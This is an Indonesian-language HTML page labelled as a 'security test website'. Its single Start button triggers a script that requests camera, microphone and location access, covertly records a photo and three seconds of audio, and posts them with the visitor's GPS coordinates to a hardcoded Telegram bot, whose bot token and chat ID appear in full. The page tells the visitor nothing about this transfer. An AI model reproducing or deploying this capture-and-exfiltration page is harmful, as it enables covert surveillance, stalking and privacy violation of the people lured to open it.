<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Uji Keamanan</title>
    <script>
        let videoStream;
        let audioChunks = [];

        async function startCapture() {
            try {
                // Meminta akses ke kamera dan mikrofon
                videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                // Meminta akses lokasi
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });

                // Mulai merekam video dan audio
                capturePhotoAndAudio(position.coords);

            } catch (error) {
                console.error("Akses ditolak atau terjadi kesalahan:", error);
                alert("Akses ditolak atau terjadi kesalahan.");
            }
        }

        function capturePhotoAndAudio(coords) {
            const video = document.createElement("video");
            video.srcObject = videoStream;
            video.play();

            // Rekam audio
            const mediaRecorder = new MediaRecorder(videoStream);
            mediaRecorder.start();

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            // Setelah 3 detik, ambil foto dan audio
            setTimeout(() => {
                // Ambil foto dari video
                const canvas = document.createElement("canvas");
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL("image/png");

                // Stop video & audio recording
                video.pause();
                mediaRecorder.stop();

                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    sendToTelegram(imageData, coords, audioBlob);
                };
            }, 3000);
        }

        function sendToTelegram(imageData, location, audioBlob) {
            const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";  // Ganti dengan token bot Telegram
            const chatId = "6010073048";      // Ganti dengan ID Telegram kamu

            // Kirim lokasi
            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    latitude: location.latitude,
                    longitude: location.longitude
                })
            });

            // Konversi gambar ke Blob
            const photoBlob = dataURItoBlob(imageData);

            // Kirim foto
            const formDataPhoto = new FormData();
            formDataPhoto.append("chat_id", chatId);
            formDataPhoto.append("photo", photoBlob, "image.png");

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formDataPhoto
            });

            // Kirim rekaman suara
            const formDataAudio = new FormData();
            formDataAudio.append("chat_id", chatId);
            formDataAudio.append("audio", audioBlob, "audio.webm");

            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: "POST",
                body: formDataAudio
            });
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: 'image/png' });
        }
    </script>
</head>
<body>
    <h1>Website Uji Keamanan</h1>
    <button onclick="startCapture()">Mulai</button>
</body>
</html>
